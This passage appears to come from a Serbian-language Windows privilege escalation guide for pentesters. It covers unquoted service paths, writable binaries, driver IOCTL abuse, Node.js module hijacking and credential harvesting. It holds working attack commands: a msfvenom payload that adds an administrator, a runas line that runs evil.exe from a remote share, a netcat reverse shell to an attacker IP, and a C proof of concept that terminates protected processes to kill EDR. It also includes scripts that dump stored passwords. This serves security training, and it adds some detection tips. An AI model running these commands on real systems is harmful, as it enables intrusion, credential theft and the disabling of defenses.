for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete detektovati i iskoristiti** ovu ranjivost sa metasploit-om: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati service binary sa metasploit-om:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows omogućava korisnicima da navedu akcije koje treba preduzeti ako servis zakaže. Ova funkcija može da se konfiguriše tako da pokazuje na binary. Ako je ovaj binary zamenjiv, možda je moguća privilege escalation. Više detalja može se naći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Proverite **permissions of the binaries** (možda možete da prepišete neki i eskalirate privileges) i **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete da izmenite neki config fajl kako biste pročitali neki poseban fajl ili da li možete da izmenite neki binary koji će biti izvršen nalogom Administratora (schedtasks).

Jedan način da pronađete slabe dozvole za folder/fajlove u sistemu je da uradite:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ automatski učitava svaki plugin DLL unutar svojih `plugins` podfascikli. Ako postoji writable portable/copy instalacija, ubacivanje malicious plugina daje automatsko code execution unutar `notepad++.exe` pri svakom pokretanju (uključujući iz `DllMain` i plugin callback-ova).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Proverite da li možete da overwrite-ujete neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns locations za privilege escalation**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Potražite moguće **third party weird/vulnerable** drivere
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako drajver izlaže proizvoljan kernel read/write primitive (što je uobičajeno kod loše dizajniranih IOCTL handlera), možeš da eskaliraš tako što ćeš direktno ukrasti SYSTEM token iz kernel memorije. Pogledaj korak-po-korak tehniku ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Za race-condition bugs gde ranjivi poziv otvara Object Manager putanju pod kontrolom napadača, namerno usporavanje lookup-a (koristeći komponente maksimalne dužine ili duboke lance direktorijuma) može da proširi prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities omogućavaju deterministic layouts, abuse writable HKLM/HKU descendants, i pretvaranje metadata corruption u kernel paged-pool overflows bez custom driver-a. Saznaj kompletan chain ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Neki driver-i prihvataju registry putanju iz userland-a, proveravaju samo da je to razuman UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` u stack scalar kao što je `int readValue`. Ako `RTL_QUERY_REGISTRY_TYPECHECK` nedostaje, `EntryContext` se tumači prema **stvarnom** tipu registry vrednosti, a ne tipu koji je developer očekivao.

Ovo stvara dve korisne primitive:

- **Confused deputy / oracle**: korisnički kontrolisana apsolutna `\Registry\...` putanja omogućava driver-u da query-uje ključeve koje napadač izabere, leak-uje postojanje kroz return codes/logs, i ponekad čita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Kernel memory corruption**: scalar destinacija kao što je `&readValue` postaje type-confused kao `REG_QWORD`, `UNICODE_STRING`, ili sized binary buffer, u zavisnosti od tipa registry vrednosti.

Praktične napomene za exploitation:

- **Windows 8+ mitigation**: ako query pogodi **untrusted hive** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, kernel caller-i padaju sa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi exploitability ostala, traži **attacker-writable keys unutar trusted system hives** umesto da staging radiš vrednosti pod `HKCU`.
- **Trusted-hive staging**: koristi NtObjectManager da nabrojiš writable descendants od `\Registry\Machine`, i ponovo pokreni skeniranje sa dupliranim **low-integrity** tokenom da pronađeš ključeve dostupne iz sandboxed konteksta:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8-byte direktan upis u 4-byte `int` kvari susedne stack podatke i može delimično da prepiše obližnji callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` pod kontrolom napadača u stack skalar, a zatim ponovo koristi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na `Buffer` pointer, što daje semi-controlled kernel write.
- **`REG_BINARY`**: za velike binarne podatke, direct mode tretira prvi `LONG` na `EntryContext` kao signed veličinu bafera. Ako prethodno `REG_DWORD` čitanje ostavi **negativnu** vrednost pod kontrolom napadača u ponovo korišćenom skalaru, sledeći `REG_BINARY` query kopira napadačeve bajtove direktno preko susednih stack slotova, što je često najčistiji put do potpunog overwrite-a callback-pointera.

Jak hunting pattern: **heterogeneous registry reads u istu stack varijablu bez ponovnog inicijalizovanja**. Grep za `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene `EntryContext` pointere, i code paths gde prvi registry read kontroliše da li će se drugi read desiti.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Neki potpisani third‑party driveri kreiraju svoj device object sa jakim SDDL preko IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, secure DACL se ne primenjuje kada se device otvara kroz putanju koja sadrži dodatnu komponentu, pa bilo koji neprivilegovani korisnik može da dobije handle koristeći namespace putanju kao:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz real-world slučaja)

Jednom kada korisnik može da otvori device, privileged IOCTL-ovi koje driver izlaže mogu da se zloupotrebe za LPE i tampering. Primeri mogućnosti viđeni u praksi:
- Vraćanje full-access handle-ova ka proizvoljnim procesima (token theft / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničen raw disk read/write (offline tampering, boot-time persistence trikovi).
- Termination proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava AV/EDR kill iz user land-a preko kernel-a.

Minimalni PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Uvek postavite FILE_DEVICE_SECURE_OPEN kada kreirate device objekte koji treba da budu ograničeni DACL-om.
- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite termination procesa ili vraćanje handle-ova.
- Ograničite IOCTLs (access masks, METHOD_*, validaciju inputa) i razmotrite brokered modele umesto direktnih kernel privilegija.

Detection ideas for defenders
- Pratite user-mode otvaranja sumnjivih naziva device-a (npr. \\ .\\amsdk*) i specifične IOCTL sekvence koje ukazuju na abuse.
- Primenite Microsoft-ov vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i održavajte sopstvene allow/deny liste.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking preko `C:\node_modules`

Ovo je Windows **uncontrolled search path** varijanta koja utiče na **Node.js** i **Electron** aplikacije kada izvrše običan import kao što je `require("foo")` i očekivani modul **nedostaje**.

Node rešava pakete tako što se kreće uzlazno kroz direktorijumsku strukturu i proverava `node_modules` foldere u svakom roditeljskom direktorijumu. Na Windows-u, taj prolazak može da stigne do root-a diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može na kraju da proverava:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **low-privileged user** može da napravi `C:\node_modules`, može da ubaci zlonamerni `foo.js` (ili folder paketa) i sačeka da **higher-privileged Node/Electron process** reši nedostajuću zavisnost. Payload se izvršava u security context-u procesa žrtve, pa ovo postaje **LPE** kad god se target izvršava kao administrator, iz elevated scheduled task/service wrapper-a, ili iz auto-startovanog privileged desktop app-a.

Ovo je posebno često kada:

- je zavisnost navedena u `optionalDependencies`
- third-party library omota `require("foo")` u `try/catch` i nastavi dalje nakon greške
- je paket uklonjen iz production build-ova, izostavljen tokom packaging-a, ili nije uspeo da se instalira
- ranjivi `require()` se nalazi duboko u dependency tree-u umesto u main application code-u

### Hunting vulnerable targets

Koristite **Procmon** da dokažete resolution path:

- Filter po `Process Name` = target executable (`node.exe`, Electron app EXE, ili wrapper process)
- Filter po `Path` `contains` `node_modules`
- Fokusirajte se na `NAME NOT FOUND` i poslednji uspešan open ispod `C:\node_modules`

Korisni code-review obrasci u unpacked `.asar` fajlovima ili application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Eksploatacija

1. Identifikuj **ime paketa koje nedostaje** pomoću Procmon ili pregleda izvornog koda.
2. Kreiraj root lookup direktorijum ako već ne postoji:
```powershell
mkdir C:\node_modules
```
3. Ubaci modul sa tačno očekivanim imenom:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Pokrenite žrtvinu aplikaciju. Ako aplikacija pokuša `require("foo")` i legitimni modul nije prisutan, Node može učitati `C:\node_modules\foo.js`.

Primeri iz stvarnog sveta za nedostajuće opcionе module koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je deo koji se ponovo može koristiti: pronađite bilo koji **missing bare import** koji će privilegovani Windows Node/Electron proces rešiti.

### Ideje za detekciju i hardening

- Alartujte kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` fajlove/pakete.
- Tražite high-integrity procese koji čitaju iz `C:\node_modules\*`.
- Spakujte sve runtime dependencies u produkciji i proverite upotrebu `optionalDependencies`.
- Pregledajte third-party kod zbog tihih `try { require("...") } catch {}` obrazaca.
- Onemogućite optional probes kada to biblioteka podržava (na primer, neka `ws` okruženja mogu da izbegnu legacy `utf-8-validate` probe sa `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljenja
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proverite da li postoje drugi poznati računari hardkodovani u hosts fajlu
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite **restricted services** spolja
```bash
netstat -ano #Opened ports?
```
### Rutiranje tabele
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Pravila firewall-a

[**Proverite ovu stranicu za komande povezane sa firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(prikaži pravila, kreiraj pravila, isključi, isključi...)**

Više[ komandi za mrežno enumerisanje ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` se takođe može pronaći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete slušati na bilo kom portu (prvi put kada koristite `nc.exe` da slušate na portu, pojaviće se GUI upit da li firewall treba da dozvoli `nc`).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati sa `--default-user root`

Možete istražiti `WSL` fajl sistem u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke kredencijale za servere, veb-sajtove i druge programe u koje se **Windows** može **automatski prijaviti korisnicima**. Na prvi pogled, to bi moglo da izgleda kao da korisnici sada mogu da sačuvaju svoje Facebook kredencijale, Twitter kredencijale, Gmail kredencijale itd., tako da se automatski prijavljuju putem browsera. Ali nije tako.

Windows Vault čuva kredencijale u koje se Windows može automatski prijaviti korisnicima, što znači da svaka **Windows aplikacija kojoj trebaju kredencijali za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault i da koristi prosleđene kredencijale umesto da korisnici stalno unose username i password.

Osim ako aplikacije ne interaguju sa Credential Manager-om, ne mislim da je moguće da koriste kredencijale za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa credential manager-om i zatraži kredencijale za taj resurs** iz podrazumevanog storage vault-a.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` da biste iskoristili sačuvane kredencijale. Sledeći primer poziva udaljeni binarni fajl putem SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa prosleđenim skupom kredencijala.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, pretežno korišćen unutar Windows operativnog sistema za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisnički ili sistemski secret kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa koji je izveden iz korisnikovih login secrets**. U scenarijima koji uključuju sistemsko šifrovanje, koristi sistemske secrets za autentikaciju domena.

Šifrovani korisnički RSA ključevi, koristeći DPAPI, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI key, zajedno sa master key-jem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta slučajnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može izlistati pomoću `dir` komande u CMD-u, iako se može izlistati kroz PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Fajlovi sa kredencijalima zaštićeni master password-om** se obično nalaze u:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** se često koriste za **scripting** i automatizacione zadatke kao način da se praktično čuvaju šifrovani kredencijali. Kredencijali su zaštićeni koristeći **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Za **decrypt** PS credentials iz fajla koji ih sadrži možete uraditi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno izvršene komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **dekriptuješ bilo koje .rdg fajlove**\
Možeš **izvući mnoge DPAPI masterkey-eve** iz memorije pomoću Mimikatz `sekurlsa::dpapi` modula

### Sticky Notes

Ljudi često koriste StickyNotes aplikaciju na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je to fajl baze podataka. Ovaj fajl se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek ga vredi pretražiti i pregledati.

### AppCmd.exe

**Imaj na umu da za oporavak lozinki iz AppCmd.exe moraš biti Administrator i pokrenuti ga pod High Integrity nivoom.**\
**AppCmd.exe** se nalazi u `%systemroot%\system32\inetsrv\` direktorijumu.\
Ako ovaj fajl postoji, moguće je da su neke **credentials** konfigurisane i da mogu biti **recovered**.

Ovaj kod je izvučen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instaleri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fajlovi i Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` pa zato treba da proverite da li se unutra nalazi nešto zanimljivo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos unutar te putanje, to je verovatno sačuvani SSH ključ. Čuva se šifrovano, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri podizanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se preko ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao korišćenje `dpapi.dll` tokom asimetrične autentikacije ključem.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Takođe možete pretražiti ove fajlove koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backup-ovi
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potraži fajl pod nazivom **SiteList.xml**

### Cached GPP Pasword

Pre je bila dostupna funkcija koja je omogućavala raspoređivanje prilagođenih lokalnih administratorskih naloga na grupu mašina putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne sigurnosne propuste. Prvo, Group Policy Objects (GPOs), skladišteni kao XML fajlovi u SYSVOL, mogli su da budu dostupni svakom domain korisniku. Drugo, lozinke unutar ovih GPPs, enkriptovane sa AES256 koristeći javno dokumentovan podrazumevani ključ, mogle su da budu dekriptovane od strane bilo kog autentifikovanog korisnika. Ovo je predstavljalo ozbiljan rizik, jer je moglo da omogući korisnicima da steknu povišene privilegije.

